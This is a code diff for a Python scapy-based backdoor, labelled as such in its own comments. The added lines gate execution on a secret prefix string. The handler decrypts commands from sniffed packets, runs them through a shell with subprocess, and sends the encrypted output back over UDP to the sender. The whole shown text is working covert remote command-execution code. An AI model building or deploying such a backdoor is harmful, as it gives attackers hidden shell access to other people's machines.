@@ -10,6 +10,12 @@ import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 
+# string to use as unique identification for our backdoor
+# we use this because ports might not be unique enough in all situations
+# if you want to change this to another value make sure both the client and
+# backdoor have the same string
+authString = "This is not a backdoor"
+
 # Function: runCommand
 # Parameters: packet - packet that get passed in from scapy
 #
@@ -21,13 +27,17 @@ from scapy.all import *
 def runCommand(packet):
   encryptedData = packet['Raw'].load
   data = crypto.decrypt(encryptedData)
-  print "Running command " + data
-  output = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-  output = output.stdout.read() + output.stderr.read()
-  encryptedOutput = crypto.encrypt(output)
-  packet = IP(dst=packet[0][1].src)/UDP(dport=int(args.sourcePort), sport=int(args.destPort))/Raw(load=encryptedOutput)
-  time.sleep(0.1)
-  send(packet, verbose=0)
+  # make sure the data starts with the authString, otherwise it isn't a packet
+  # meant for our backdoor and we shouldn't process it
+  if data.startswith(authString):
+    data = data[len(authString):]
+    print "Running command " + data
+    output = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    output = authString + output.stdout.read() + output.stderr.read()
+    encryptedOutput = crypto.encrypt(output)
+    packet = IP(dst=packet[0][1].src)/UDP(dport=int(args.sourcePort), sport=int(args.destPort))/Raw(load=encryptedOutput)
+    time.sleep(0.1)
+    send(packet, verbose=0)
 
 # Function: setProcessName
 #
